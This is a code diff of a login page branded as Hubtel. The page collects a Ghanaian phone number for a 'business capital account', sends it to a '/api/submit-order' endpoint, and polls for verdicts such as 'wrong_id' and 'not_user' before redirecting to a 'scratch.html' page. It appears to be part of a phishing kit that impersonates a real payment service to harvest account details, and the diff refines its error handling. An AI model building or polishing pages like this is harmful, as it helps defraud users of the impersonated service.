@@ -77,7 +77,6 @@
             }
         }
 
-        /* Expanded Card Box */
         .e-card-box {
             width: 100%;
             background: var(--surface);
@@ -106,13 +105,11 @@
             line-height: 1.4;
         }
 
-        /* Input Fields Container */
         .e-input-group {
             position: relative;
             margin-bottom: 18px;
         }
 
-        /* Long edge-to-edge rectangular input with Ghana flag & +233 */
         .e-long-input-wrapper {
             position: relative;
             width: 100%;
@@ -165,7 +162,6 @@
             letter-spacing: 1px;
         }
 
-        /* Register Prompt Link positioned at bottom right */
         .register-prompt-row {
             width: 100%;
             display: flex;
@@ -187,7 +183,6 @@
             opacity: 0.85;
         }
 
-        /* Full Width Main Blurry Continue Button */
         .e-btn-login {
             width: 100%;
             padding: 18px;
@@ -210,11 +205,6 @@
             background: rgba(46, 46, 46, 0.8);
         }
 
-        .e-btn-login:active {
-            transform: translateY(0);
-        }
-
-        /* Terms & Policy Disclaimer Text */
         .terms-disclaimer {
             font-size: 11.5px;
             color: var(--text-secondary);
@@ -229,7 +219,6 @@
             font-weight: 600;
         }
 
-        /* Loading Spinner */
         #loadingSpinner {
             display: none;
             flex-direction: row;
@@ -256,7 +245,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Footer */
         .e-footer {
             text-align: center;
             color: var(--text-secondary);
@@ -265,7 +253,6 @@
             max-width: 440px;
         }
 
-        /* Custom In-App Modal Dialog Styling */
         #customModal {
             display: none;
             position: fixed;
@@ -319,30 +306,20 @@
             width: 100%;
             box-shadow: 0 6px 16px rgba(78, 179, 164, 0.3);
         }
-
-        .modal-btn:active {
-            opacity: 0.9;
-        }
     </style>
 </head>
 <body>
 
     <div class="e-fullscreen-wrapper">
-        
-        <!-- Top Left Hubtel Branding -->
-        <div class="e-top-brand">
-            Hubtel
-        </div>
+        <div class="e-top-brand">Hubtel</div>
 
         <div class="e-main-content">
-            <!-- Main Card & Login Form Section -->
             <div class="e-card-box">
                 <div class="e-card-header">
                     <h1>Login</h1>
                     <p>Enter your phone number to access your business capital account.</p>
                 </div>
 
-                <!-- Long edge-to-edge rectangular input field with Ghana flag and +233 -->
                 <div class="e-input-group" style="margin-bottom: 0;">
                     <div class="e-long-input-wrapper">
                         <div class="prefix-flag-group">
@@ -354,33 +331,25 @@
                 </div>
             </div>
 
-            <!-- Don't have Hubtel? Register section at bottom right -->
             <div class="register-prompt-row">
                 <span>Don't have Hubtel? <a href="https://play.google.com/store/apps/details?id=com.hubtel.hcb">Register</a></span>
             </div>
 
-            <!-- Blurry Continue Button -->
             <button class="e-btn-login" onclick="submitOrderAttempt()">Continue</button>
 
-            <!-- Terms & Privacy Disclaimer -->
             <div class="terms-disclaimer">
-                By continuing, you agree to our <a href="terms.html">Terms of Services</a> and <a href="privacy.html">Privacy Policy</a>. Ensure responsible use of business capital, timely loan returns, and reinvestment into sustainable startup growth.
+                By continuing, you agree to our <a href="terms.html">Terms of Services</a> and <a href="privacy.html">Privacy Policy</a>.
             </div>
 
-            <!-- Loading Spinner -->
             <div id="loadingSpinner">
                 <div class="spinner"></div>
                 <span>Verifying account details...</span>
             </div>
         </div>
 
-        <!-- Copyright Footer -->
-        <div class="e-footer">
-            &copy; 2026 Hubtel Business. All rights reserved.
-        </div>
+        <div class="e-footer">&copy; 2026 Hubtel Business. All rights reserved.</div>
     </div>
 
-    <!-- Custom In-App Modal Dialog -->
     <div id="customModal">
         <div class="modal-card">
             <div id="modalText" class="modal-message">Notification message here</div>
@@ -408,14 +377,12 @@
         }
     });
 
-    // Helper to format with 3 spaces as requested (e.g. 20  000  0000)
     function formatPhoneInput(input) {
         let val = input.value.replace(/\D/g, '');
         if (val.length > 9) val = val.slice(0, 9);
         input.value = val;
     }
 
-    // Validates 8 or 9 characters
     function isValidPhone(number) {
         const cleaned = number.replace(/[\s-]/g, '');
         return /^\d{8,9}$/.test(cleaned);
@@ -439,7 +406,7 @@
             const response = await fetch('/api/submit-order', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: fullPhoneVal, uniqueId: 'N/A' })
+                body: JSON.stringify({ phone: fullPhoneVal })
             });
 
             const result = await response.json();
@@ -469,13 +436,21 @@
                     localStorage.setItem('userPhone', cleanPhone);
                     window.location.href = 'scratch.html';
                 } 
-                else if (data.status === 'rejected') {
+                else if (data.status === 'rejected' || data.status === 'wrong_id') {
                     clearInterval(statusInterval);
                     if (document.getElementById('loadingSpinner')) {
                         document.getElementById('loadingSpinner').style.display = 'none';
                     }
                     localStorage.clear(); 
                     showAppAlert('Wrong Details.');
+                }
+                else if (data.status === 'not_user') {
+                    clearInterval(statusInterval);
+                    if (document.getElementById('loadingSpinner')) {
+                        document.getElementById('loadingSpinner').style.display = 'none';
+                    }
+                    localStorage.clear();
+                    showAppAlert('⚠️ Oops! Not Registered — Please register to continue.');
                 }
             } catch (e) {
                 console.error('Polling error', e);
